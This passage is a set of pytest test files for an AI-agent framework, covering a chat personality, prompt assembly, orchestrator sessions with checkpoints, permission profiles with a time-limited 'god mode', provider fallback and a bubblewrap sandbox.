            describe_tool_fn=_describe,
        )
        assert "\n\n" in prefix

```

## `tests/test_lobi.py`

```python
# tests/test_lobi.py — Tests for Lobi personality

import pytest
from tests.conftest import FakeUnifiedClient


class TestLobi:
    def test_personality(self, fake_client, memory, fake_tools):
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert lobi.personality == "lobi"

    def test_default_model(self, fake_client, memory, fake_tools):
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert lobi.model == "gpt-5-mini"

    def test_default_provider(self, fake_client, memory, fake_tools):
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert lobi.provider == "openai"

    def test_text_color(self, fake_client, memory, fake_tools):
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert lobi.text_color == "cyan"

    def test_system_message_contains_lobi(self, fake_client, memory, fake_tools):
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert "Lobi" in lobi.system_message

    def test_di_forwarding(self, fake_client, memory, fake_tools):
        """Verify **kwargs forwards client/memory/tools to Elf.__init__."""
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert lobi.client is fake_client
        assert lobi.memory is memory
        assert lobi.tools is fake_tools

    def test_examples_not_empty(self, fake_client, memory, fake_tools):
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        assert len(lobi.examples) > 0

    def test_chat_works(self, fake_client, memory, fake_tools):
        from lobi.lobi import Lobi
        lobi = Lobi(debug=False, client=fake_client, memory=memory, tools=fake_tools)
        result = lobi.chat("hello", stream=False)
        assert result == "Hello from fake client"

```

## `tests/test_messages.py`

```python
# tests/test_messages.py — Tests for message assembly functions

from core.runtime.messages import build_system_prompt, build_chat_context


class TestBuildSystemPrompt:
    def _describe(self, name):
        return {"description": f"desc for {name}"}

    def test_includes_system_message(self):
        result = build_system_prompt("You are a bot.", [], self._describe, [])
        assert "You are a bot." in result

    def test_includes_tool_descriptions(self):
        result = build_system_prompt(
            "sys", ["run_shell"], self._describe, []
        )
        assert "run_shell: desc for run_shell" in result

    def test_includes_examples(self):
        examples = [("How?", "Like this.")]
        result = build_system_prompt("sys", [], self._describe, examples)
        assert "User: How?" in result
        assert "Assistant: Like this." in result

    def test_handles_empty_tools_and_examples(self):
        result = build_system_prompt("sys", [], self._describe, [])
        assert "sys" in result
        assert "tools" in result.lower()

    def test_multiple_tools(self):
        result = build_system_prompt(
            "sys", ["tool_a", "tool_b"], self._describe, []
        )
        assert "tool_a: desc for tool_a" in result
        assert "tool_b: desc for tool_b" in result

    def test_multiple_examples(self):
        examples = [("Q1", "A1"), ("Q2", "A2")]
        result = build_system_prompt("sys", [], self._describe, examples)
        assert "User: Q1" in result
        assert "User: Q2" in result


class TestBuildChatContext:
    def test_replaces_system_message(self):
        history = [
            {"role": "system", "content": "old system"},
            {"role": "user", "content": "hello"},
        ]
        result = build_chat_context("new system prompt", history)
        assert result[0]["role"] == "system"
        assert result[0]["content"] == "new system prompt"

    def test_preserves_history(self):
        history = [
            {"role": "system", "content": "sys"},
            {"role": "user", "content": "msg1"},
            {"role": "assistant", "content": "reply1"},
        ]
        result = build_chat_context("sys prompt", history)
        assert len(result) == 3
        assert result[1]["content"] == "msg1"
        assert result[2]["content"] == "reply1"

    def test_appends_tool_context(self):
        history = [
            {"role": "system", "content": "sys"},
            {"role": "user", "content": "hi"},
        ]
        result = build_chat_context("sys prompt", history, invoked_tools=["run_shell"])
        assert "[Tool Context]" in result[0]["content"]
        assert "run_shell" in result[0]["content"]

    def test_no_tool_context_when_none(self):
        history = [
            {"role": "system", "content": "sys"},
            {"role": "user", "content": "hi"},
        ]
        result = build_chat_context("sys prompt", history, invoked_tools=None)
        assert "[Tool Context]" not in result[0]["content"]

    def test_empty_history_beyond_system(self):
        history = [{"role": "system", "content": "sys"}]
        result = build_chat_context("new sys", history)
        assert len(result) == 1
        assert result[0]["content"] == "new sys"

```

## `tests/test_orchestrator_sessions.py`

```python
# tests/test_orchestrator_sessions.py — Tests for SessionManager + Orchestrator integration

import json
import pytest
from pathlib import Path

from core.kernel.state import Phase, SessionState
from core.kernel.orchestrator import Orchestrator, PhaseResult
from core.kernel.budgets import BudgetConfig
from core.sessions.manager import SessionManager
from core.contracts.schemas import TaskContract, RunReport, FinalReport


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

class StubDispatcher:
    """Succeeds on every phase (no structured output)."""
    def dispatch(self, phase: Phase, state: SessionState) -> PhaseResult:
        return PhaseResult(success=True)


class StructuredDispatcher:
    """Returns schema-appropriate structured output for phases with schemas."""

    def dispatch(self, phase: Phase, state: SessionState) -> PhaseResult:
        if phase == Phase.INTAKE:
            return PhaseResult(
                success=True,
                output=TaskContract(task_id="t1", description="test task"),
            )
        if phase == Phase.CONTRACT:
            return PhaseResult(
                success=True,
                output=TaskContract(task_id="t1", description="test task refined"),
            )
        if phase == Phase.RUN:
            return PhaseResult(
                success=True,
                output=RunReport(exit_code=0, passed=True, stdout="ok"),
            )
        if phase == Phase.FINALIZE:
            return PhaseResult(
                success=True,
                output=FinalReport(
                    task_description="test task",
                    outcome="completed",
                    total_iterations=10,
                ),
            )
        return PhaseResult(success=True)


class FailOnRunDispatcher:
    """Fails on RUN phase to test rollback."""
    def __init__(self):
        self.run_calls = 0

    def dispatch(self, phase: Phase, state: SessionState) -> PhaseResult:
        if phase == Phase.RUN:
            self.run_calls += 1
            return PhaseResult(success=False, error="tests failed", needs_fix=True)
        if phase == Phase.FIX:
            return PhaseResult(success=True)
        if phase == Phase.PATCH:
            return PhaseResult(success=True)
        return PhaseResult(success=True)


class ValidationFailDispatcher:
    """Returns invalid data for INTAKE to test validation failure."""
    def __init__(self):
        self.call_count = 0

    def dispatch(self, phase: Phase, state: SessionState) -> PhaseResult:
        if phase == Phase.INTAKE:
            self.call_count += 1
            # Return a dict missing required 'description' field
            return PhaseResult(
                success=True,
                output={"task_id": "t1"},  # missing description
            )
        return PhaseResult(success=True)


# ---------------------------------------------------------------------------
# Tests: SessionManager wiring
# ---------------------------------------------------------------------------

class TestOrchestratorWithSession:
    def test_session_id_set_on_state(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="test-001")
        orch = Orchestrator(
            dispatcher=StubDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")
        assert state.session_id == "test-001"
        assert state.session_dir == sm.session_dir

    def test_no_session_manager_defaults_none(self):
        orch = Orchestrator(dispatcher=StubDispatcher())
        state = orch.run("test task")
        assert state.session_id is None
        assert state.session_dir is None

    def test_still_completes_with_session_manager(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path)
        orch = Orchestrator(
            dispatcher=StubDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED


# ---------------------------------------------------------------------------
# Tests: Artifact recording
# ---------------------------------------------------------------------------

class TestArtifactRecording:
    def test_structured_output_written_to_disk(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="art-001")
        orch = Orchestrator(
            dispatcher=StructuredDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")
        assert state.current_phase == Phase.COMPLETED

        # Check that artifacts were written
        all_artifacts = sm.load_all_artifacts()
        assert len(all_artifacts) > 0

    def test_intake_artifact_recorded(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="art-002")
        orch = Orchestrator(
            dispatcher=StructuredDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")

        intake = sm.load_latest_artifact("INTAKE")
        assert intake is not None
        assert intake["task_id"] == "t1"

    def test_run_artifact_recorded(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="art-003")
        orch = Orchestrator(
            dispatcher=StructuredDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")

        run = sm.load_latest_artifact("RUN")
        assert run is not None
        assert run["passed"] is True

    def test_artifact_path_in_state(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="art-004")
        orch = Orchestrator(
            dispatcher=StructuredDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")
        assert "INTAKE" in state.artifacts


# ---------------------------------------------------------------------------
# Tests: Validate-or-retry
# ---------------------------------------------------------------------------

class TestValidateOrRetry:
    def test_validation_failure_burns_retry(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="val-001")
        dispatcher = ValidationFailDispatcher()
        budget = BudgetConfig(max_phase_retries=2, max_total_iterations=30)
        orch = Orchestrator(
            dispatcher=dispatcher,
            budget=budget,
            session_manager=sm,
        )
        state = orch.run("test task")

        # Should halt because INTAKE validation keeps failing
        assert state.current_phase == Phase.HALTED
        # Dispatcher was called multiple times (retries before exhaustion)
        assert dispatcher.call_count >= 2

    def test_no_validation_without_session_manager(self):
        """Without session_manager, validation is skipped."""
        dispatcher = ValidationFailDispatcher()
        orch = Orchestrator(dispatcher=dispatcher)
        state = orch.run("test task")
        # Completes because validation is not enforced
        assert state.current_phase == Phase.COMPLETED


# ---------------------------------------------------------------------------
# Tests: Checkpoint and rollback
# ---------------------------------------------------------------------------

class TestCheckpointRollback:
    def test_checkpoint_created_before_patch(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="cp-001")
        orch = Orchestrator(
            dispatcher=StubDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")

        # Check that a checkpoint was created
        checkpoints = list((sm.session_dir / "checkpoints").iterdir())
        assert len(checkpoints) > 0
        assert any("pre_PATCH" in cp.name for cp in checkpoints)

    def test_rollback_on_run_failure(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="rb-001")
        dispatcher = FailOnRunDispatcher()
        budget = BudgetConfig(max_phase_retries=2, max_total_iterations=15)
        orch = Orchestrator(
            dispatcher=dispatcher,
            budget=budget,
            session_manager=sm,
        )
        state = orch.run("test task")

        # Should eventually halt (budget exhausted from PATCH→RUN→FIX→PATCH loop)
        assert state.current_phase == Phase.HALTED
        # Confirm RUN was attempted
        assert dispatcher.run_calls >= 1

    def test_last_patch_checkpoint_in_artifacts(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path, session_id="cp-002")
        orch = Orchestrator(
            dispatcher=StubDispatcher(),
            session_manager=sm,
        )
        state = orch.run("test task")
        assert "_last_patch_checkpoint" in state.artifacts

```

## `tests/test_profile_schemas.py`

```python
# tests/test_profile_schemas.py — ProfileMode, GodModeGrant, AuditEntry tests

import pytest
from datetime import datetime, timezone, timedelta
from core.contracts.schemas import ProfileMode, GodModeGrant, AuditEntry


class TestProfileMode:
    def test_values(self):
        assert ProfileMode.SAFE == "safe"
        assert ProfileMode.DEV == "dev"
        assert ProfileMode.OPS == "ops"
        assert ProfileMode.GOD == "god"

    def test_is_string(self):
        assert isinstance(ProfileMode.SAFE, str)

    def test_iteration_order(self):
        modes = list(ProfileMode)
        assert modes == [ProfileMode.SAFE, ProfileMode.DEV, ProfileMode.OPS, ProfileMode.GOD]

    def test_from_string(self):
        assert ProfileMode("safe") is ProfileMode.SAFE
        assert ProfileMode("god") is ProfileMode.GOD


class TestGodModeGrant:
    def test_defaults(self):
        g = GodModeGrant(reason="testing")
        assert g.activated_by == "user"
        assert g.reason == "testing"
        assert g.ttl_seconds == 300.0
        assert g.panic_revoked is False
        assert isinstance(g.activated_at, datetime)

    def test_custom_ttl(self):
        g = GodModeGrant(reason="deploy", ttl_seconds=60.0)
        assert g.ttl_seconds == 60.0

    def test_serialization(self):
        g = GodModeGrant(reason="test")
        data = g.model_dump()
        assert data["reason"] == "test"
        assert "activated_at" in data

    def test_panic_revoked(self):
        g = GodModeGrant(reason="test", panic_revoked=True)
        assert g.panic_revoked is True


class TestAuditEntry:
    def test_defaults(self):
        e = AuditEntry()
        assert e.event_type == ""
        assert e.tool_name == ""
        assert e.action == ""
        assert e.scopes == []
        assert e.verdict == ""

    def test_tool_dispatch_entry(self):
        e = AuditEntry(
            event_type="tool_dispatch",
            tool_name="git",
            action="push",
            scopes=["git.push"],
            verdict="allowed",
        )
        assert e.event_type == "tool_dispatch"
        assert e.tool_name == "git"
        assert e.action == "push"

    def test_serialization(self):
        e = AuditEntry(event_type="panic", profile="safe", verdict="panic_revoked")
        data = e.model_dump()
        assert data["event_type"] == "panic"
        assert data["profile"] == "safe"

```

## `tests/test_profiles.py`

```python
# tests/test_profiles.py — Profile system + wildcard capability tests

import pytest
from core.contracts.schemas import ProfileMode, PolicyPack, PermissionGrant
from core.policy.profiles import PROFILE_SCOPES, policy_for_profile
from core.tools.capability import CapabilityEngine


class TestProfileScopes:
    def test_safe_scopes(self):
        scopes = PROFILE_SCOPES[ProfileMode.SAFE]
        assert "fs.read" in scopes
        assert "git.read" in scopes
        assert "verify.run" in scopes

    def test_dev_scopes(self):
        scopes = PROFILE_SCOPES[ProfileMode.DEV]
        assert "fs.write" in scopes
        assert "git.write" in scopes
        assert "python.exec" in scopes
        assert "shell.exec" in scopes

    def test_ops_scopes(self):
        scopes = PROFILE_SCOPES[ProfileMode.OPS]
        assert "git.push" in scopes
        assert "git.fetch" in scopes
        assert "pip.install" in scopes
        assert "http.read" in scopes
        assert "fs.delete" in scopes

    def test_god_is_wildcard(self):
        assert "*" in PROFILE_SCOPES[ProfileMode.GOD]


class TestPolicyForProfile:
    def test_safe_only_read_scopes(self):
        policy = policy_for_profile(ProfileMode.SAFE)
        assert "fs.read" in policy.allowed_scopes
        assert "git.read" in policy.allowed_scopes
        assert "verify.run" in policy.allowed_scopes
        # Should NOT include write scopes
        assert "fs.write" not in policy.allowed_scopes
        assert "git.write" not in policy.allowed_scopes

    def test_dev_includes_safe(self):
        policy = policy_for_profile(ProfileMode.DEV)
        # Safe scopes included
        assert "fs.read" in policy.allowed_scopes
        assert "git.read" in policy.allowed_scopes
        # Dev scopes included
        assert "fs.write" in policy.allowed_scopes
        assert "python.exec" in policy.allowed_scopes
        # OPS scopes NOT included
        assert "git.push" not in policy.allowed_scopes

    def test_ops_includes_dev_and_safe(self):
        policy = policy_for_profile(ProfileMode.OPS)
        # All lower level scopes
        assert "fs.read" in policy.allowed_scopes
        assert "fs.write" in policy.allowed_scopes
        assert "git.push" in policy.allowed_scopes
        assert "pip.install" in policy.allowed_scopes

    def test_god_includes_wildcard(self):
        policy = policy_for_profile(ProfileMode.GOD)
        assert "*" in policy.allowed_scopes

    def test_scopes_are_deduplicated(self):
        policy = policy_for_profile(ProfileMode.OPS)
        assert len(policy.allowed_scopes) == len(set(policy.allowed_scopes))


class TestWildcardCapability:
    def test_wildcard_allows_any_scope(self):
        policy = PolicyPack(allowed_scopes=["*"])
        engine = CapabilityEngine(policy)
        verdict = engine.check("any_tool", ["some.random.scope"])
        assert verdict.allowed is True

    def test_wildcard_allows_multiple_scopes(self):
        policy = PolicyPack(allowed_scopes=["*"])
        engine = CapabilityEngine(policy)
        verdict = engine.check("t", ["a.b", "c.d", "e.f"])
        assert verdict.allowed is True

    def test_no_wildcard_denies_missing_scope(self):
        policy = PolicyPack(allowed_scopes=["fs.read"])
        engine = CapabilityEngine(policy)
        verdict = engine.check("t", ["fs.write"])
        assert verdict.allowed is False

    def test_god_profile_allows_everything(self):
        engine = CapabilityEngine(policy_for_profile(ProfileMode.GOD))
        verdict = engine.check("any_tool", ["git.push", "fs.delete", "nuke.launch"])
        assert verdict.allowed is True


class TestSetProfile:
    def test_set_profile_changes_policy(self):
        engine = CapabilityEngine()
        # Default deny-all
        verdict = engine.check("t", ["fs.read"])
        assert verdict.allowed is False
        # Set to SAFE
        engine.set_profile(ProfileMode.SAFE)
        verdict = engine.check("t", ["fs.read"])
        assert verdict.allowed is True

    def test_set_profile_tracks_current(self):
        engine = CapabilityEngine()
        engine.set_profile(ProfileMode.DEV)
        assert engine.current_profile == "dev"

    def test_upgrade_profile(self):
        engine = CapabilityEngine()
        engine.set_profile(ProfileMode.SAFE)
        verdict = engine.check("t", ["git.write"])
        assert verdict.allowed is False
        engine.set_profile(ProfileMode.DEV)
        verdict = engine.check("t", ["git.write"])
        assert verdict.allowed is True

    def test_downgrade_profile(self):
        engine = CapabilityEngine()
        engine.set_profile(ProfileMode.OPS)
        verdict = engine.check("t", ["git.push"])
        assert verdict.allowed is True
        engine.set_profile(ProfileMode.SAFE)
        verdict = engine.check("t", ["git.push"])
        assert verdict.allowed is False


class TestRevokeAllGrants:
    def test_revoke_clears_grants(self):
        engine = CapabilityEngine()
        engine.add_grant(PermissionGrant(tool_name="t", scope="x.y"))
        assert len(engine.list_active_grants()) == 1
        count = engine.revoke_all_grants()
        assert count == 1
        assert len(engine.list_active_grants()) == 0

    def test_revoke_empty(self):
        engine = CapabilityEngine()
        count = engine.revoke_all_grants()
        assert count == 0

    def test_revoked_grant_no_longer_works(self):
        engine = CapabilityEngine()
        engine.add_grant(PermissionGrant(tool_name="t", scope="x.y"))
        verdict = engine.check("t", ["x.y"])
        assert verdict.allowed is True
        engine.revoke_all_grants()
        verdict = engine.check("t", ["x.y"])
        assert verdict.allowed is False

```

## `tests/test_provider_config.py`

```python
# tests/test_provider_config.py — Tests for provider resolution and defaults

import os
import pytest

from core.runtime.provider_config import DEFAULT_MODELS, resolve_provider


class TestDefaultModels:
    def test_openai_default(self):
        assert DEFAULT_MODELS["openai"] == "gpt-4o-mini"

    def test_mistral_default(self):
        assert DEFAULT_MODELS["mistral"] == "codestral-latest"

    def test_keys(self):
        assert set(DEFAULT_MODELS.keys()) == {"openai", "mistral"}


class TestResolveProvider:
    def test_explicit_provider(self):
        assert resolve_provider(requested="mistral", has_injected_client=True) == "mistral"

    def test_explicit_openai(self):
        assert resolve_provider(requested="openai", has_injected_client=True) == "openai"

    def test_env_var(self, monkeypatch):
        monkeypatch.setenv("ELF_PROVIDER", "mistral")
        assert resolve_provider(has_injected_client=True) == "mistral"

    def test_default_is_openai(self):
        assert resolve_provider(has_injected_client=True) == "openai"

    def test_injected_client_skips_fallback(self):
        """With an injected client, no key checking / fallback happens."""
        result = resolve_provider(requested="openai", has_injected_client=True)
        assert result == "openai"

    def test_fallback_openai_to_mistral(self, monkeypatch):
        """No OpenAI key -> falls back to mistral."""
        monkeypatch.delenv("OPENAI_API_KEY", raising=False)
        monkeypatch.setenv("MISTRAL_API_KEY", "key")
        result = resolve_provider(requested="openai", has_injected_client=False)
        assert result == "mistral"

    def test_fallback_mistral_to_openai(self, monkeypatch):
        """No Mistral key -> falls back to openai."""
        monkeypatch.delenv("MISTRAL_API_KEY", raising=False)
        monkeypatch.setenv("OPENAI_API_KEY", "key")
        result = resolve_provider(requested="mistral", has_injected_client=False)
        assert result == "openai"

    def test_case_insensitive(self):
        assert resolve_provider(requested="OpenAI", has_injected_client=True) == "openai"

    def test_strips_whitespace(self):
        assert resolve_provider(requested="  mistral  ", has_injected_client=True) == "mistral"

```

## `tests/test_repo_map_models.py`

```python
# tests/test_repo_map_models.py — Tests for repo map data models

import pytest
from pydantic import BaseModel

from core.context.models import (
    SymbolDef,
    ImportEdge,
    FileSymbols,
    RepoMapData,
    RepoMapResult,
)


# ---------------------------------------------------------------------------
# SymbolDef
# ---------------------------------------------------------------------------

class TestSymbolDef:
    def test_minimal_construction(self):
        s = SymbolDef(name="foo", kind="function")
        assert s.name == "foo"
        assert s.kind == "function"
        assert s.signature == ""
        assert s.parent == ""
        assert s.decorators == []
        assert s.line == 0

    def test_full_construction(self):
        s = SymbolDef(
            name="bar", kind="method", signature="def bar(self, x: int) -> str",
            parent="MyClass", decorators=["staticmethod"], line=42,
        )
        assert s.parent == "MyClass"
        assert s.decorators == ["staticmethod"]
        assert s.line == 42

    def test_mutable(self):
        s = SymbolDef(name="a", kind="class")
        s.name = "b"
        assert s.name == "b"


# ---------------------------------------------------------------------------
# ImportEdge
# ---------------------------------------------------------------------------

class TestImportEdge:
    def test_minimal(self):
        e = ImportEdge(module="os.path")
        assert e.module == "os.path"
        assert e.names == []
        assert e.is_relative is False

    def test_with_names(self):
        e = ImportEdge(module="core.kernel.state", names=["Phase", "SessionState"])
        assert len(e.names) == 2

    def test_relative(self):
        e = ImportEdge(module=".sibling", is_relative=True)
        assert e.is_relative is True


# ---------------------------------------------------------------------------
# FileSymbols
# ---------------------------------------------------------------------------

class TestFileSymbols:
    def test_minimal(self):
        fs = FileSymbols(rel_path="src/main.py")
        assert fs.rel_path == "src/main.py"
        assert fs.language == ""
        assert fs.symbols == []
        assert fs.imports == []

    def test_with_symbols_and_imports(self):
        syms = [SymbolDef(name="foo", kind="function")]
        imps = [ImportEdge(module="os")]
        fs = FileSymbols(rel_path="a.py", language="python", symbols=syms, imports=imps)
        assert len(fs.symbols) == 1
        assert len(fs.imports) == 1


# ---------------------------------------------------------------------------
# RepoMapData
# ---------------------------------------------------------------------------

class TestRepoMapData:
    def test_empty(self):
        data = RepoMapData(repo_root="/tmp/repo")
        assert data.total_files == 0
        assert data.total_symbols == 0
        assert data.commit_hash == ""

    def test_total_counts(self):
        fs1 = FileSymbols(
            rel_path="a.py",
            symbols=[SymbolDef(name="foo", kind="function"),
                     SymbolDef(name="bar", kind="function")],
        )
        fs2 = FileSymbols(
            rel_path="b.py",
            symbols=[SymbolDef(name="Baz", kind="class")],
        )
        data = RepoMapData(
            repo_root="/tmp/repo",
            files={"a.py": fs1, "b.py": fs2},
            commit_hash="abc123",
        )
        assert data.total_files == 2
        assert data.total_symbols == 3
        assert data.commit_hash == "abc123"


# ---------------------------------------------------------------------------
# RepoMapResult (Pydantic model)
# ---------------------------------------------------------------------------

class TestRepoMapResult:
    def test_is_pydantic_model(self):
        assert issubclass(RepoMapResult, BaseModel)

    def test_defaults(self):
        r = RepoMapResult()
        assert r.excerpt == ""
        assert r.total_files == 0
        assert r.total_symbols == 0
        assert r.excerpt_token_estimate == 0
        assert r.files_shown == 0
        assert r.files_omitted == 0

    def test_full_construction(self):
        r = RepoMapResult(
            excerpt="src/main.py\n| main() -> None",
            total_files=50,
            total_symbols=200,
            excerpt_token_estimate=1024,
            files_shown=20,
            files_omitted=30,
        )
        assert r.total_files == 50
        assert r.files_shown + r.files_omitted == r.total_files

    def test_serialization_roundtrip(self):
        r = RepoMapResult(
            excerpt="hello", total_files=10, total_symbols=50,
            excerpt_token_estimate=256, files_shown=5, files_omitted=5,
        )
        data = r.model_dump()
        restored = RepoMapResult(**data)
        assert restored == r

    def test_json_roundtrip(self):
        r = RepoMapResult(excerpt="test", total_files=1)
        json_str = r.model_dump_json()
        restored = RepoMapResult.model_validate_json(json_str)
        assert restored == r

```

## `tests/test_sandbox.py`

```python
# tests/test_sandbox.py

import subprocess
import pytest
from unittest.mock import patch, MagicMock

from core.tools.sandbox import NoneSandbox, BwrapSandbox, get_sandbox, SandboxRunner
from core.tools.descriptors import SandboxProfile


class TestNoneSandbox:
    def test_simple_command(self):
        sandbox = NoneSandbox()
        rc, out, err = sandbox.execute("echo hello")
        assert rc == 0
        assert "hello" in out

    def test_list_command(self):
        sandbox = NoneSandbox()
        rc, out, err = sandbox.execute(["echo", "world"])
        assert rc == 0
        assert "world" in out

    def test_nonzero_exit(self):
        sandbox = NoneSandbox()
        rc, out, err = sandbox.execute("exit 42", timeout=5)
        assert rc == 42

    def test_timeout(self):
        sandbox = NoneSandbox()
        rc, out, err = sandbox.execute("sleep 10", timeout=1)
        assert rc == -1
        assert "timed out" in err.lower()

    def test_env_passthrough(self):
        sandbox = NoneSandbox()
        rc, out, err = sandbox.execute(
            "echo $TEST_SANDBOX_VAR",
            env={"TEST_SANDBOX_VAR": "injected"},
        )
        assert rc == 0
        assert "injected" in out

    def test_profile_ignored(self):
        """NoneSandbox ignores profile (no enforcement)."""
        sandbox = NoneSandbox()
        profile = SandboxProfile(max_cpu_seconds=1)
        rc, out, err = sandbox.execute("echo ok", profile=profile)
        assert rc == 0

    def test_stderr_captured(self):
        sandbox = NoneSandbox()
        rc, out, err = sandbox.execute("echo err >&2")
        assert "err" in err

    def test_conforms_to_protocol(self):
        """NoneSandbox satisfies SandboxRunner protocol."""
        sandbox = NoneSandbox()
        assert hasattr(sandbox, "execute")
        # Structural subtyping — just check the method signature works
        rc, out, err = sandbox.execute("true")
        assert rc == 0


class TestBwrapSandboxArgBuilding:
    @patch("core.tools.sandbox.shutil.which", return_value="/usr/bin/bwrap")
    def test_basic_args(self, mock_which):
        sandbox = BwrapSandbox()
        profile = SandboxProfile()
        args = sandbox._build_bwrap_args(profile)
        assert args[0] == "bwrap"
        assert "--unshare-net" in args
        assert "--ro-bind" in args
        assert "--proc" in args
        assert "--dev" in args
        assert "--tmpfs" in args

    @patch("core.tools.sandbox.shutil.which", return_value="/usr/bin/bwrap")
    def test_workspace_writable(self, mock_which):
        sandbox = BwrapSandbox()
        profile = SandboxProfile(workspace_writable=True)
        args = sandbox._build_bwrap_args(profile)
        assert "--bind" in args

    @patch("core.tools.sandbox.shutil.which", return_value="/usr/bin/bwrap")
    def test_workspace_not_writable(self, mock_which):
        sandbox = BwrapSandbox()
        profile = SandboxProfile(workspace_writable=False)
        args = sandbox._build_bwrap_args(profile)
        # Should not have --bind for cwd (only --ro-bind for /)
        bind_indices = [i for i, a in enumerate(args) if a == "--bind"]
        assert len(bind_indices) == 0

    @patch("core.tools.sandbox.shutil.which", return_value="/usr/bin/bwrap")
    def test_write_paths(self, mock_which):
        sandbox = BwrapSandbox()
        profile = SandboxProfile(
            workspace_writable=False,
            allowed_write_paths=["/tmp/output"],
        )
        args = sandbox._build_bwrap_args(profile)
        idx = args.index("/tmp/output")
        assert args[idx - 1] == "--bind"

    @patch("core.tools.sandbox.shutil.which", return_value="/usr/bin/bwrap")
    def test_read_paths(self, mock_which):
        sandbox = BwrapSandbox()
        profile = SandboxProfile(
            workspace_writable=False,
            allowed_read_paths=["/etc/config"],
        )
        args = sandbox._build_bwrap_args(profile)
        assert "/etc/config" in args


class TestBwrapAvailability:
    @patch("core.tools.sandbox.shutil.which", return_value=None)
    def test_not_available(self, mock_which):
        assert BwrapSandbox.is_available() is False

    @patch("core.tools.sandbox.shutil.which", return_value="/usr/bin/bwrap")
    def test_available(self, mock_which):
        assert BwrapSandbox.is_available() is True

    @patch("core.tools.sandbox.shutil.which", return_value=None)
    def test_init_raises_if_not_available(self, mock_which):
        with pytest.raises(FileNotFoundError, match="bwrap not found"):
            BwrapSandbox()


class TestGetSandbox:
    def test_default_returns_none_sandbox(self):
        sandbox = get_sandbox()
        assert isinstance(sandbox, NoneSandbox)

    def test_explicit_none(self):
        sandbox = get_sandbox("none")
        assert isinstance(sandbox, NoneSandbox)

    @patch("core.tools.sandbox.BwrapSandbox.is_available", return_value=False)
    def test_bwrap_fallback(self, mock_avail):
        sandbox = get_sandbox("bwrap")
        assert isinstance(sandbox, NoneSandbox)

    @patch("core.tools.sandbox.shutil.which", return_value="/usr/bin/bwrap")
    def test_bwrap_when_available(self, mock_which):
        sandbox = get_sandbox("bwrap")
        assert isinstance(sandbox, BwrapSandbox)

```

## `tests/test_session_manager.py`

```python
# tests/test_session_manager.py — Tests for SessionManager

import json
import pytest
from pathlib import Path

from core.sessions.manager import SessionManager
from core.contracts.schemas import (
    TaskContract,
    ChangePlan,
    PlanStep,
    RunReport,
    FinalReport,
    PermissionGrant,
    MemoryPin,
)


@pytest.fixture
def sm(tmp_path):
    """SessionManager in a temp directory with known session_id."""
    return SessionManager(base_dir=tmp_path, session_id="test-session")


# ---------------------------------------------------------------------------
# Construction
# ---------------------------------------------------------------------------

class TestSessionManagerConstruction:
    def test_creates_directories(self, sm):
        assert sm.session_dir.exists()
        assert (sm.session_dir / "artifacts").is_dir()
        assert (sm.session_dir / "checkpoints").is_dir()
        assert (sm.session_dir / "grants").is_dir()
        assert (sm.session_dir / "memory_pins").is_dir()

    def test_session_id(self, sm):
        assert sm.session_id == "test-session"

    def test_auto_generated_session_id(self, tmp_path):
        sm = SessionManager(base_dir=tmp_path)
        assert len(sm.session_id) == 12

    def test_session_dir_path(self, sm, tmp_path):
        expected = tmp_path / "sessions" / "test-session"
        assert sm.session_dir == expected


# ---------------------------------------------------------------------------
# Artifacts
# ---------------------------------------------------------------------------

class TestArtifacts:
    def test_write_artifact(self, sm):
        tc = TaskContract(task_id="t1", description="Add pagination")
        path = sm.write_artifact("INTAKE", 0, tc)
        assert path.exists()
        assert path.name == "000_INTAKE_TaskContract.json"
        data = json.loads(path.read_text())
        assert data["task_id"] == "t1"

    def test_write_multiple_artifacts(self, sm):
        tc1 = TaskContract(task_id="t1", description="First")
        tc2 = TaskContract(task_id="t2", description="Second")
        p1 = sm.write_artifact("INTAKE", 0, tc1)
        p2 = sm.write_artifact("CONTRACT", 1, tc2)
        assert p1.name == "000_INTAKE_TaskContract.json"
        assert p2.name == "001_CONTRACT_TaskContract.json"

    def test_load_latest_artifact(self, sm):
        tc1 = TaskContract(task_id="t1", description="First")
        tc2 = TaskContract(task_id="t2", description="Updated")
        sm.write_artifact("INTAKE", 0, tc1)
        sm.write_artifact("INTAKE", 3, tc2)
        latest = sm.load_latest_artifact("INTAKE")
        assert latest["task_id"] == "t2"

    def test_load_latest_artifact_missing(self, sm):
        assert sm.load_latest_artifact("INTAKE") is None

    def test_load_all_artifacts(self, sm):
        tc = TaskContract(task_id="t1", description="Task")
        rr = RunReport(exit_code=0, passed=True)
        sm.write_artifact("INTAKE", 0, tc)
        sm.write_artifact("RUN", 1, rr)
        all_arts = sm.load_all_artifacts()
        assert len(all_arts) == 2
        assert all_arts[0]["task_id"] == "t1"
        assert all_arts[1]["passed"] is True

